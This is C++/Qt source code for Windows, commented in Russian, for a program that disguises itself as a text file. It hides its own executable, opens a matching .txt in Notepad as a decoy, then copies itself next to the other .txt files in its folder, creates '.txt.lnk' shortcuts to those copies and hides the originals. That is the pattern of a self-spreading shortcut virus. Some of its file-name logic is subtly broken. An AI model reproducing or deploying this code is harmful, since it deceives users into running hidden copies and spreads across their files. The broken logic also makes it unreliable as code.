#include <QApplication>
#include <QDir>
#include <QCoreApplication>
#include <QProcess>
#include <windows.h>

int main(int argc, char *argv[])
{

    QString nameProg = argv[0];
    nameProg=QString::fromLocal8Bit(argv[0]);
    SetFileAttributes((LPCTSTR)nameProg.utf16(), FILE_ATTRIBUTE_HIDDEN);
    QFileInfo info(nameProg);
    QString nameTxt = info.path() + "/" + info.completeBaseName() + ".txt";
    QStringList param;
    param.append(nameTxt);
    if(!QProcess::startDetached("notepad", param))
    {
        QProcess::startDetached("notepad");
    }
    SetFileAttributes((LPCTSTR)nameTxt.utf16(), FILE_ATTRIBUTE_HIDDEN);

    // Определяем рабочую папку
    QString nameDir = nameProg;
    while(nameDir[nameDir.length()-1] != '\\') nameDir = nameDir.left(nameDir.length()-1);

    QDir dir(nameDir);
    QStringList listNameFile = dir.entryList();

    // Ищем не обработанные .txt
    QString current;
    for(int i = 0; i < listNameFile.length(); i++)
    {
        current = listNameFile.at(i);
        if(current.length() > 4)
        {
            if((current.at(current.length()-4) == '.') &&
                    (current.at(current.length()-3) == 't') &&
                    (current.at(current.length()-2) == 'x') &&
                    (current.at(current.length()-1) == 't'))
            {
                // Проверка на наличие .exe
                QString nameExe = current;
                QFileInfo inf(nameExe);
                nameTxt = inf.path() + "/" + inf.completeBaseName() + ".exe";
                if(!QFile::exists(nameExe))
                {
                    // Если нет, то создаём файл и линк
                    QString nameNewExe = nameDir + nameExe;
                    QFile::copy(nameProg, nameNewExe);
                    QString nameLink = nameNewExe;
                    QFileInfo inf2(nameLink);
                    nameLink = info.path() + "/" + info.completeBaseName() + ".txt.lnk";
                    QFile::link(nameNewExe, nameLink);
                }
                // На всякий случай скрываем .txt и .exe
                SetFileAttributes((LPCTSTR)((nameDir + current).utf16()), FILE_ATTRIBUTE_HIDDEN);
                SetFileAttributes((LPCTSTR)((nameDir + nameExe).utf16()), FILE_ATTRIBUTE_HIDDEN);
            }
        }
    }

    return 0;
}
